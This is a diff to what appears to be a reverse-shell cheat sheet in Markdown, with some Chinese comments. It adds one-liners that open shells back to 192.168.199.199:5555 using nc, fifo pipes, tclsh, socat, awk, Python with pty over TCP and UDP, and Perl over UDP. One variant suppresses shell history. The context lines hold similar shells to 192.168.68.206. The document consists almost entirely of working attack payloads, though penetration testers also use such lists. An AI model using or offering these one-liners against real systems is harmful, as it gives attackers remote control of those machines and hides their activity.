@@ -25,8 +25,10 @@ $ exec 5<>/dev/tcp/192.168.68.206/2333 cat <&5 | while read line 0<&5; do $line 
 
 ```bash
 $ nc -e /bin/sh 192.168.68.206 2333  //linux下默认安装的nc不带e参数，可上传带e参数的nc进行编译运行
-$ rm /tmp/fl;mkfifo /tmp/fl;cat /tmp/fl|/bin/sh -i 2>&1|nc 192.168.68.206 2333 >/tmp/fl
-$ mknod /tmp/fl p | /bin/sh 0</tmp/fl | nc 192.168.68.206 2333 1>/tmp/fl
+$ mkfifo fifo ; nc.traditional -u 192.168.199.199 5555 < fifo | { bash -i; } > fifo
+$ nc 192.168.199.199 5555 -c /bin/bash
+$ if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.199.199 5555 > /tmp/f
+$ if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc 192.168.199.199 5555 0</tmp/f|/bin/bash 1>/tmp/f
 $ nc 192.168.68.206 2333|/bin/sh|nc 192.168.68.206 2444  //需要在本地监听俩端口，一个做命令输入，另一个做回显
 ```
 
@@ -38,10 +40,37 @@ $ mknod /tmp/fl p && telnet 192.168.68.206 2333 0</tmp/fl | /bin/bash 1>/tmp/fl
 $ telnet 192.168.68.206 2333|/bin/sh|telnet 192.168.68.206 2444  //需要在本地监听俩端口，一个做命令输入，另一个做回显
 ```
 
+### TCHsh
+
+```bash
+$ echo 'set s [socket 192.168.199.199 5555];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh # tcp
+```
+
+### socat
+
+```bash
+$ socat tcp-connect:192.168.199.199:5555 exec:"bash -li",pty,stderr,setsid,sigint,sane # tcp
+```
+
+### awk
+
+```Bash
+$ # tcp
+$ awk 'BEGIN {s = "/inet/tcp/0/192.168.199.199/5555"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+$ # udp
+$ awk 'BEGIN {s = "/inet/udp/0/192.168.199.199/5555"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
 #### Python
 
 ```bash
+$ # tcp shell
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.206",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+$ # tcp + pty
+$ python -c "import os; import pty; import socket; lhost = '192.168.199.199'; lport = 5555; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();"
+$ # udp +pty
+$ python -c "import os; import pty; import socket; lhost = '192.168.199.199'; lport = 5555; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();"
+$ # subprocess
 $ python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.68.206',2333))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
 ```
 
@@ -108,6 +137,8 @@ if __name__ == "__main__":
 ```bash
 $ perl -e 'use Socket;$i="192.168.68.206";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 $ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.68.206:2333");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+$ perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(PeerAddr => "192.168.199.199:5555",Proto => "udp"); $s->send("SHELLPOP PWNED!
+");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'
 ```
 
 ```perl
